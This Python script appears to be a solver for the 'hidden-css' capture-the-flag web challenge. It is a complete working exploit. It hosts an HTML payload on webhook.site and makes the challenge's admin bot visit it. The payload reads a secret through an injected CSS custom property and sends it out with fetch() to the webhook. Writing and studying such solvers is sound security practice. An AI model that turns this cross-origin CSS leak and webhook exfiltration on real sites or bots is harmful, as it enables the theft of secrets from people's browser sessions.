from pathlib import Path
import requests
import sys
import time
import urllib.parse

CHAL_URL = 'https://hidden-css-tlejfksioa-ul.a.run.app'

# goto https://webhook.site/ and it'll assign you a free token
with open(Path(__file__).with_name('hook-token.txt'), 'r') as file:
    HOOK_TOKEN = file.read().replace('\n', '')

HOOK_URL = f'https://webhook.site/{HOOK_TOKEN}'
HOOK_DELETE_URL = f'https://webhook.site/token/{HOOK_TOKEN}/request'
HOOK_READ_URL = f'https://webhook.site/token/{HOOK_TOKEN}/request/latest'

with open(Path(__file__).with_name('flag-prefix.txt'), 'r') as file:
    FLAG_PREFIX = file.read().replace('\n', '')

# Not using an f-string since I'd have to double-the braces which
# would make the payload harder to read.
HTML_FOR_BOT = """
<html>
<head>
    <link rel="stylesheet" type="text/css" href="http://0:1337/css?prefix=p{--frog:" />
</head>
<body>
<p id="gotcha">before</p>
<script>
    setTimeout(()=>{
        let property = getComputedStyle(gotcha).getPropertyValue('--frog')
        fetch('""" + HOOK_URL + """?flag='+property)
    }, 100)
</script>
</body>
</html>
"""


def clearHookSite():
    response = requests.delete(HOOK_DELETE_URL)
    if response.status_code != 200:
        print('error deleting hook site, status code: ', response.status_code, response.text)
        sys.exit(1)


def getLastHookRequest():
    for retry in range(0, 5):
        time.sleep(1)
        response = requests.get(HOOK_READ_URL)
        if response.status_code != 200:
            continue

        return response.json()

    print('error reading hook request')
    sys.exit(1)


def postHtmlPayload():
    # post our HTML payload to webhook
    response = requests.post(HOOK_URL, files = {"file": HTML_FOR_BOT})
    if response.status_code != 200:
        print('error posting to hook site, status code: ', response.status_code, response.text)
        sys.exit(1)

    json = getLastHookRequest()
    # print(json)

    uuid = json.get('uuid')
    fileId = json.get('files').get('file').get('id')

    # get a URL to this page
    payloadUrl1 = f'https://webhook.site/token/{HOOK_TOKEN}/request/{uuid}/download/{fileId}'

    # We cannot use this URL directly since it starts with https and our payload
    # specifies a stylesheet link using http.  So we MUST have an http link.

    # Request this page and see where it redirects.
    response = requests.get(payloadUrl1, allow_redirects=False)
    if response.status_code != 302:
        print('expected 302 redirect, got status code: ', response.status_code, response.text)
        sys.exit(1)

    # From experience, this is an https link into AWS.
    # Turn it into an http link (which lucikly still returns the same content).
    location = response.headers.get('Location')
    parts = location.split(':', 1)
    payloadUrl2 = 'http:' + parts[1]
    # print('payloadUrl2: ', payloadUrl2)

    return payloadUrl2



def solve():
    clearHookSite()
    payloadUrl = postHtmlPayload()

    data = {'url': payloadUrl}

    postUrl = CHAL_URL + '/visit'
    response = requests.post(postUrl, data)
    if response.status_code != 200:
        print('error submitting url, status code: ', response.status_code)
        sys.exit(1)

    time.sleep(1)
    hookJson = getLastHookRequest()
    hookQuery = hookJson.get('query')
    hookFlag = hookQuery.get('flag')

    if FLAG_PREFIX not in hookFlag:
        print('error, flag not found: ', hookFlag)
        sys.exit(1)

    print('hidden-css solved')



solve()

